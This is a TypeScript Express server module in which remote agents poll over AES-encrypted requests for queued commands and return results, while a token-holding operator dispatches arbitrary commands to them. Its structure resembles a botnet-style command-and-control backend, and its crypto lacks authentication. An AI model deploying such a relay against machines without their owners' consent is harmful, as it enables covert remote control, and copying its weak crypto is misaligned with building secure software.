import { Express, Request, Response } from "express";
import crypto from "crypto";
import { ENV } from "./_core/env";

const key = Buffer.from(ENV.agentE2eKey, 'base64');

function decrypt(encryptedText: string): any {
    try {
        const parts = encryptedText.split(':');
        if (parts.length !== 3) throw new Error("Invalid encrypted format");
        
        const iv = Buffer.from(parts[0], 'hex');
        const ciphertext = Buffer.from(parts[2], 'hex');
        
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        let decrypted = decipher.update(ciphertext, undefined, 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (e) {
        throw new Error("Decryption failed");
    }
}

function encrypt(text: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8');
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return `0000000000000000:${iv.toString('hex')}:${encrypted.toString('hex')}`;
}

interface Agent {
    last_seen: number;
    pending: any[];
    results: { [key: string]: any };
}

const agents: { [key: string]: Agent } = {};

export function registerAgentRoutes(app: Express) {
    if (!ENV.agentToken || !ENV.agentE2eKey) {
        console.warn("AGENT_TOKEN or AGENT_E2E_KEY is missing");
    }

    app.post("/agent/poll", (req: Request, res: Response) => {
        try {
            let data = req.body;
            if (data.encrypted_payload) data = decrypt(data.encrypted_payload);
            
            const agentId = data.agent_id;
            if (!agents[agentId]) agents[agentId] = { last_seen: 0, pending: [], results: {} };
            agents[agentId].last_seen = Date.now();
            
            const cmd = agents[agentId].pending.length > 0 ? agents[agentId].pending.shift() : null;
            res.json({ encrypted_payload: encrypt(JSON.stringify({ cmd })) });
        } catch (error) {
            res.status(400).json({ error: "bad request" });
        }
    });

    app.post("/agent/result", (req: Request, res: Response) => {
        try {
            let data = req.body;
            if (data.encrypted_payload) data = decrypt(data.encrypted_payload);
            
            const { agent_id, req_id, result } = data;
            if (agents[agent_id]) agents[agent_id].results[req_id] = result;
            res.json({ ok: true });
        } catch (error) {
            res.status(400).json({ error: "bad request" });
        }
    });

    app.post("/bot/send", (req: Request, res: Response) => {
        if (req.headers["x-token"] !== ENV.agentToken) return res.status(401).json({ error: "unauthorized" });
        
        const { agent_id, cmd } = req.body;
        const reqId = crypto.randomUUID();

        if (!agents[agent_id]) return res.status(404).json({ error: "agent offline" });
        agents[agent_id].pending.push({ id: reqId, cmd });

        let waited = 0;
        const interval = setInterval(() => {
            if (agents[agent_id] && agents[agent_id].results[reqId]) {
                clearInterval(interval);
                const result = agents[agent_id].results[reqId];
                delete agents[agent_id].results[reqId];
                return res.json({ result });
            }
            if (++waited > 120) {
                clearInterval(interval);
                return res.status(504).json({ error: "timeout" });
            }
        }, 1000);
    });

    app.get("/agents", (req: Request, res: Response) => {
        if (req.headers["x-token"] !== ENV.agentToken) return res.status(401).json({ error: "unauthorized" });
        res.json({ agents: Object.keys(agents) });
    });
}
